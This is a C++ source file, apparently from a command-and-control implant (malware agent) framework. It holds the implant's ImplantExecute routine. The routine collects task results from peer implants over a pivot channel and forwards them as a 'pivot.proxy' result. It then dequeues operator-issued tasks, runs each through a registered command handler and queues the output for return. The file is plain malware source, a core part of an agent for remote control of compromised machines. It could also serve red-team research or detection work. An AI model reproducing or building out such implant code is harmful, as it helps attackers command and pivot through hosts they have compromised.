#include "Command.h"
#include "Implant.h"
#include "Peer.h"

BOOL ImplantExecute( DWORD Count ) {
    PLIST_ENTRY Entry        = NULL;
    PTASK_INFO  TaskInfo     = NULL;
    json        TaskArgs     = json::array();
    string      TaskArtifact = string();
    json        TaskResult   = json::object();
    json        TaskRequest  = json::array();

    // Pull executed tasks from peer implants
    LIST_ENTRY* Current              = g_PeerList.Flink;
    json        PivotTaskResultArray = json::array();

    if (!IsListEmpty( &g_PeerList )) {
        while (Current != &g_PeerList) {
            PPEER_IMPLANT Peer     = CONTAINING_RECORD( Current, PEER_IMPLANT, ListEntry );
            VOID*         Data     = NULL;
            DWORD         DataSize = 0;

            if (!PeerRead( Peer->ID, &Data, &DataSize )) {
                // check retries
                goto NextNode;
            }

            TaskResult = json::parse( (CHAR*)Data, (CHAR*)Data + DataSize );
            PivotTaskResultArray.push_back( TaskResult );

        NextNode:
            Current = Current->Flink;
        }

        json PivotTaskResult = json::object();

        if (PivotTaskResultArray.size()) {
            PivotTaskResult["name"]     = "pivot.proxy";
            PivotTaskResult["artifact"] = PivotTaskResultArray.dump();
            ImplantQueueTaskResult( PivotTaskResult );
        }
    }

    TaskResult.clear();

    while (!IsListEmpty( &g_Implant.TaskRequestList ) && Count--) {
        Entry    = RemoveHeadList( &g_Implant.TaskRequestList );
        TaskInfo = CONTAINING_RECORD( Entry, TASK_INFO, ListEntry );

        TaskRequest = TaskInfo->Data;
        for (const auto& Handler : g_CommandRegistry) {

            if (Handler.Name == TaskRequest["name"]) {

                // Optional
                TaskArgs     = TaskRequest["args"].is_null() ? json::array() : TaskRequest["args"];
                TaskArtifact = TaskRequest["artifact"].is_null() ? "" : TaskRequest["artifact"].get<std::string>();

                if (!Handler.Invoke( TaskArgs, TaskArtifact, TaskResult )) {
                    printf( "[-] Failed to execute task: %s\n", Handler.Name.c_str() );
                    break;
                }

                ImplantQueueTaskResult( TaskResult );

                break;
            }
        }
    }

    return TRUE;
}
